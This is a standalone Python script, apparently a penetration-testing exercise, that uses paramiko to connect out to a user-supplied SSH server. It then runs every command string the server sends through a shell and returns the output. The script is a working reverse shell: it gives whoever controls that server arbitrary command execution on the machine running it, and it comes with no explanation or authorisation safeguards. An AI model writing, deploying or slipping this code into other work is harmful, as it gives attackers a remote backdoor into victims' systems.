#!/usr/bin/env python3

import paramiko
import subprocess
import getpass

def reverse_ssh_client(ip, port, username, password, initial_command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=username, password=password)
    
    ssh_session = client.get_transport().open_session()
    
    if ssh_session.active:
        ssh_session.send(initial_command.encode())
        print(ssh_session.recv(1024).decode())
    
    try:
        while True:
            ssh_session.settimeout(30)
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode().strip()
                if cmd.lower() == "exit":
                    break

                cmd_output = subprocess.check_output(cmd, shell=True)
                ssh_session.send(cmd_output or b"okay")

            except Exception as e:
                ssh_session.send(str(e).encode())

    except KeyboardInterrupt:
        print("Interrupted by user.")
    finally:
        client.close()
        print("Connection closed.")

if __name__ == "__main__":
    username = input("Username: ")
    password = getpass.getpass("Password: ")
    ip = input("Enter server IP: ")

    while True:
        port_input = input("Enter port: ")
        try:
            port = int(port_input)
            break
        except ValueError:
            print("Invalid port. Enter a valid number.")

    reverse_ssh_client(ip, port, username, password, "Client Connected")

